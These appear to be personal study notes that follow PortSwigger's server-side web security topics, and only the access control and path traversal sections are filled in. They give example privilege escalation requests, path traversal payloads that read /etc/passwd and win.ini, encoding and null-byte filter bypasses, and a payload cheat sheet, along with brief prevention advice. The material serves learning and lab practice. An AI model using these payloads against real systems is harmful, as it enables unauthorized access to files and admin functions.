# Server-Side Topics

---

## [Access control](https://portswigger.net/web-security/access-control)

> 🔬 [Labs - Access control vulnerabilities](https://portswigger.net/web-security/all-labs#access-control-vulnerabilities)
>
> 🔗 [Access control security models](https://portswigger.net/web-security/access-control/security-models)

**Access control** - authorize users/processes to perform actions and access resources.

- **Authentication** - the users is who they say they are
- **Session management** - identify the subsequent HTTP requests made by that user
- **Access control** - the user's action is allowed or not 
- [Access control Security models](https://portswigger.net/web-security/access-control/security-models)

**Broken access control** are common critical security vulnerabilities:

- Vertical - restrict access to application sensitive functions to specific types of users (`e.g.` An admin can modify/delete any user's data/account; An ordinary user cannot)
- Horizontal - restrict access to resources to specific users (`e.g.` Different users have access to resources of the same type)
- Context-dependent - restrict access to functionality and resources base upon the app's state and user's interaction with it (`e.g.` A user cannot perform actions in the wrong order)

**Vertical privilege escalation** - a user gains access to functionalities that are not permitted to access.

`e.g.`

The admin page can be accessed by browsing to the relevant admin URL. In some cases the admin URL is disclosed in locations such as `/robots.txt` file, or by using a wordlist brute-force attack.

- Obscuring sensitive features with unpredictable URLs, often termed *security by obscurity* is not reliable for access control. Users can still find these URLs through various means, like inadvertent disclosure in role-based JavaScript.
- Access control decisions in certain applications are based on user access rights or roles determined at login, stored in user-controllable locations such as hidden fields, cookies, or preset query string parameters. These parameters can be easily modified.
- Platform misconfiguration can cause broken access control, where applications restrict access to **URLs** and **HTTP methods** based on user roles.
  - Overriding URLs with non-standard HTTP headers such as `X-Original-URL` and `X-Rewrite-URL`, can lead to bypassing access controls. Rule e.g. - `DENY: POST, /admin/deleteUser, managers`
  - The flexibility of HTTP methods can be exploited, such as using `GET` instead of the restricted method, to bypass platform-level access controls enforced based on URLs and methods.
  - Websites may interpret request paths differently, potentially causing access control URL-matching discrepancies, like treating `/admin/deleteUser` and `/admin/deleteUser/` as separate endpoints, which can be exploited to bypass controls.

**Horizontal privilege escalation** - a user gains access to resources belonging to another user.

`e.g.`

A user can access another user's account and associated data and functions, with attack similar to vertical privilege escalation.

- Manipulating parameters like `id` in URLs exploiting a **IDOR** (*insecure direct object reference*) vulnerability, can expose other's data.
- While some apps use unpredictable parameters like GUIDs to prevent guessing attacks, these unique identifiers might still be accessible through other app areas (such as user messages or reviews).
- Sometimes, an app detects unauthorized access attempts and redirects users to the login page. However, the redirected response may still leak sensitive user data.

**Horizontal to Vertical privilege escalation** - a user gain access to more privileged user functions (admin).

`e.g.`

The admin page can be accessed using horizontal privesc tampering techniques from an unprivileged user and then perform vertical privesc.

- Targeting the app's administrator, might disclose admin password or provide access to privileged functionalities.


### 🎯 Attack

```bash
https://insecure-website.com/robots.txt
https://insecure-website.com/admin

# Parameter-based access control
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1

# Platform misconfiguration broken access control
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser

# Horizontal privesc - User-ID Parameter vulnerability (IDOR)
https://insecure-website.com/myaccount?id=123

# Horizontal to Vertical privesc
https://insecure-website.com/myaccount?id=1 # where 1 is and admin id

```

### 🛡️ Prevention



### 🔬 Labs



### 📝 CheatSheet



---

## [API testing](https://portswigger.net/web-security/api-testing)




---

## [Authentication](https://portswigger.net/web-security/authentication)




---

## [Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)




---

## [File upload vulnerabilities](https://portswigger.net/web-security/file-upload)




---

## [Information disclosure](https://portswigger.net/web-security/information-disclosure)




---

## [NoSQL Injection](https://portswigger.net/web-security/nosql-injection)




---

## [OS command injection](https://portswigger.net/web-security/os-command-injection)




---

## [Path traversal](https://portswigger.net/web-security/file-path-traversal)

> 🔬 [Labs - Path Traversal](https://portswigger.net/web-security/all-labs#path-traversal)
>
> 🔗 [HackTricks - File Inclusion/Path traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
>
> 📌 [PayloadsAllTheThing - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
>
> 📌 [omurugur - Path_Travelsal_Payload_List](https://github.com/omurugur/Path_Travelsal_Payload_List)

**Path traversal** (**directory traversal**) - read arbitrary files on a server running an application.

- Read/Write arbitrary files on the server
- Modify the app
- Take full control of the server

`e.g.` 

Loading an image on a HTML website with `<img src="/loadImage?filename=218.png">` means the server reads the file `218.png` from the `/var/www/images/` directory.

### 🎯 Attack

```bash
# Linux
https://insecure-website.com/loadImage?filename=../../../etc/passwd

# Win
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

- This will make the app read the `/var/www/images/../../../etc/passwd` path that means `/etc/passwd` will be actually read.

**Defenses** like stripping or blocking directory traversal sequences, can be bypassed with:

- an **absolute path** (direct reference to a file) from the filesystem root directory - `filename=/etc/passwd`
- nested traversal sequences - `....//`, `....\/`
- (double) **URL encoding** the `../` characters  - `%2e%2e%2f`, `%252e%252e%252f`
- base folder followed by traversal sequences - `filename=/var/www/images/../../../etc/passwd`
- extension at the end, with URL encoded null byte to terminate string - `filename=../../../etc/passwd%00.png`

### 🛡️ Prevention

- Avoid passing user-supplied input to filesystem APIs or
  1. Validate user input (for permitted content/values, whitelist)
  2. Append the input to the base directory. [Canonicalize the path](https://www.geeksforgeeks.org/difference-between-getpath-and-getcanonicalpath-in-java/) and verify it starts with the expected directory

### 🔬 Labs

> 🔬 [Lab: File path traversal, simple case](../all-labs/README.md#simple-case)
>
> 🔬 [Lab: File path traversal, traversal sequences blocked with absolute path bypass](../all-labs/README.md#traversal-sequences-blocked-with-absolute-path-bypass)
>
> 🔬 [Lab: File path traversal, traversal sequences stripped non-recursively](../all-labs/README.md#traversal-sequences-stripped-non-recursively)
>
> 🔬 [Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](../all-labs/README.md#traversal-sequences-stripped-with-superfluous-url-decode)
>
> 🔬 [Lab: File path traversal, validation of start of path](../all-labs/README.md#validation-of-start-of-path)
>
> 🔬 [Lab: File path traversal, validation of file extension with null byte bypass](../all-labs/README.md#validation-of-file-extension-with-null-byte-bypass)

### 📝 CheatSheet

```bash
# Path Traversal Cheatsheet
../../../etc/passwd
../../../../../../etc/passwd
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
%2e%2e/%2e%2e/%2e%2e{FILE}
%252e%252e%252f{FILE}
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}

../../../windows\win.ini
..\..\..\windows\win.ini
```

---

## [Race conditions](https://portswigger.net/web-security/race-conditions)




---

## [Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)




---

## [SQL injection](https://portswigger.net/web-security/sql-injection)




---

## [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)




---

